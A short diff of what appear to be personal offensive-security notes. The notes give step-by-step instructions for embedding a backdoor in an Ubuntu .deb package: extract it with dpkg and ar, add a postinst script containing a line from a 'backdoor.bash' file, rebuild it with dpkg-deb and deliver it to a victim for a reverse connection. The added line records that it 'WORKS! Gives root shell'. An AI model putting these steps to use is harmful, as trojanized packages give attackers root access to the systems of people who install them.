@@ -23,9 +23,9 @@ Execute and report (via email)
 Embadding backdoors in ubuntu packages
     choose a package from https://packages.ubuntu.com/
     
-        sudo dpkg -x Downloads/flashplugin-installer_32.0.0.465ubuntu0.20.04.2_amd64.deb flash-update
-        ar -x Downloads/flashplugin-installer_32.0.0.465ubuntu0.20.04.2_amd64.deb 
+        sudo dpkg -x Downloads/htp_1.19-7_amd64.deb flash-update
+        ar -x Downloads/htp_1.19-7_amd64.deb 
             -> looking for control.tar.xz. -> Extract and edit/add postinst file (make it contain bash line from backdoor.bash)
             -> package this again $ dpkg-deb --build flash-update
             -> deliver that deb-file to get a reverse connection!
-
+            -> WORKS! Gives root shell
